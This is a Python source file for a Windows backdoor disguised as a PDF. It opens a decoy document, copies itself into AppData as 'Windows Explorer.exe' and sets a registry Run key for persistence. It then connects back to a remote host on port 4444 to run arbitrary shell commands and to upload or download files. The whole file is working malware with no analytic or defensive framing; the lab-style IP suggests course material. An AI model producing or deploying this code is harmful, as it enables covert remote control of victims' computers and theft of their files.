import base64
import json
import os
import shutil
import socket
import subprocess
import sys


class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        self.become_persistent()

    def become_persistent(self):
        evil_location = os.environ["appdata"] + "\\Windows Explorer.exe"
        if not os.path.exists(evil_location):
            shutil.copyfile(sys.executable, evil_location)
            subprocess.call(
                'reg add HCKU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_location + '""',
                shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, ex_command):
        DEVNULL = open(os.devnull, "wb")
        return subprocess.check_output(ex_command, shell=True, stderr=DEVNULL, stdin=DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload Successful"

    def run(self):
        command_result = ""
        while True:
            command = self.reliable_receive()

            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error"

            self.reliable_send(command_result)


file_name = sys.__MEIPASS + "\sample.pdf"
subprocess.Popen(file_name, shell=True)

try:
    my_backdoor = Backdoor("10.0.2.5", 4444)
    my_backdoor.run()
except Exception:
    sys.exit()
